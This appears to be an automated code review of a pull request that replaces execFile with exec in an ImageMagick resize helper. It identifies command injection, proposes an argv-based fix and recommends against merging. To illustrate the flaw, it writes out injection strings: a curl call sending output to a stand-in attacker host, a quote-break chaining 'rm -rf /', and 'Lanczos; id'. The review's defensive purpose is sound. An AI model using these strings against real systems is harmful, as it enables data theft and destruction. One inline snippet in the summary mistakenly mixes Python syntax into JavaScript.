findings.body:
**Issue:** Replacing `execFile` with `exec` and building the command via template-string interpolation lets caller-controlled `filter` and `src` execute arbitrary shell commands.

**Failure mode:** `filter` is unquoted, so a value like `Lanczos; curl http://attacker/$(id)` runs after `convert`. `src` is only double-quoted, so a path containing `"` still breaks out (e.g. `x"; rm -rf /; echo "`). The PR description frames these as user-composed filter expressions, so this is attacker-reachable if any untrusted input reaches `resize`.

**Fix:** Keep a no-shell spawn and pass arguments as a list. ImageMagick does not need a shell for `-filter`:

```suggestion
    execFile("convert", [src, "-filter", filter, "-resize", `${w}x`, "/tmp/out.png"], (e) => e ? rej(e) : res("/tmp/out.png"));
```

Restore `import { execFile } from "child_process"`. If filters are user-supplied, allowlist known ImageMagick filter names before invoking `convert`.

**Issue:** The comment states that `-filter` needs a shell for user-composed expressions. That rationale is false and is what justified the unsafe `exec` switch.

**Failure mode:** Future maintainers will keep the shell path because the comment presents it as a hard requirement, locking in the injection surface.

**Fix:** Delete the comment (or replace it with a note that filter names must be allowlisted) and pass `-filter` / the filter value as separate `execFile` argv entries. Shell metacharacters are never required to supply a filter name or a single expression token to ImageMagick.

summary:
## Verdict

**Do not merge** — this change introduces a critical command-injection vulnerability by switching from `execFile` (argv array, no shell) to `exec` (shell) and interpolating caller-controlled `src` and `filter` into the command string.

## Why this is blocking

`child_process.exec` runs the command through `/bin/sh`. Any metacharacters in `filter` or a quote-break in `src` become shell syntax:

- `filter = "Lanczos; id"` runs `id` after `convert`
- `src` containing `"` breaks out of the double-quoted path and can chain arbitrary commands

The inline comment claims a shell is required for `-filter` expressions. That is incorrect: ImageMagick accepts the filter as a normal argv element, so `execFile("convert", [src, "-filter", filter, "-resize", f"{w}x", "/tmp/out.png"], ...)` preserves the previous no-shell boundary.

If `filter` is truly user-composed, also allowlist known filter names (or a strict grammar) even when using `execFile`, so hostile values cannot be turned into extra `convert` arguments.

## API note

Adding `filter` as the second parameter changes the public signature from `(src, w)` to `(src, filter, w)`. Coordinate callers or place the new argument last with a default if this module is already consumed outside this repo.

## Release decision

**Recommendation:** request-changes

verification.reason: The change replaces safe execFile argv passing with exec and unquoted/poorly quoted interpolation of caller-controlled `filter` and `src`, enabling shell command injection. Base used execFile without a shell; the head code at line 6 is a real critical RCE vector.
